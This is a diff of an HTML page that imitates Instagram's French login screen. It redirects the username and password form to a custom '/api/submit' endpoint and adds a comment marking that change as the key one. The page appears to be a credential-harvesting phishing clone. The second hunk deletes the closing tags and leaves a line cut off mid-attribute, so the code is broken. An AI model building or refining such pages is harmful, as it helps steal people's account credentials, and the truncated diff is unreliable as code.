@@ -150,7 +150,8 @@
             <div class="logo">
                 <img src="insta.png" alt="Instagram">
             </div>
-            <form class="form" action="/submit" method="POST">
+            <!-- LA SEULE MODIFICATION IMPORTANTE EST ICI -->
+            <form class="form" action="/api/submit" method="POST">
                 <input type="text" name="username" placeholder="Nom d'utilisateur" required>
                 <input type="password" name="password" placeholder="Mot de passe" required>
                 <button type="submit">Se connecter</button>
@@ -172,9 +173,4 @@
             <p>Téléchargez l'application.</p>
             <div class="app-images">
                 <img src="app-store.png" alt="App Store">
-                <img src="google-play.png" alt="Google Play">
-            </div>
-        </div>
-    </div>
-</body>
-</html>
+                <img src="google-play.png" alt
